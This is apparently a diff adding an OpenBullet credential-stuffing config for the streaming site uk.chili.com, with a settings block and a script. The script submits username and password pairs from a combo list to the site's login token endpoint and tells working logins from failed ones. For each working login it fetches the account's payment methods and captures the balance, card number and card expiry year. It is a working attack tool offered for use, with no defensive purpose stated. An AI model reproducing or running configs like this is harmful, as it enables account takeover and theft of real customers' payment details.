@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Chilli.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-09T22:51:03.3752875+01:00",
+  "AdditionalInfo": "",
+  "Author": "TB",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://uk.chili.com/gatekeeper/api/v1/oauth2/token" 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&x_device_id=33d8ffb7-3c5f-4811-a9ab-aae4073efc31" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong E-mail and/or Password" 
+PARSE "<SOURCE>" LR "access_token\" : \"" "\"" -> VAR "token" 
+REQUEST GET "https://uk.chili.com/bill/api/v2/wallet/me/paymentMethods" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <token>" 
+PARSE "<SOURCE>" LR "balance\" : " "," Recursive=TRUE -> CAP "Balance" 
+PARSE "<SOURCE>" LR "cardNumber\" : \"" "\"" -> CAP "Card" 
+PARSE "<SOURCE>" LR "expirationYear\" : " "," -> CAP "Expiry" 
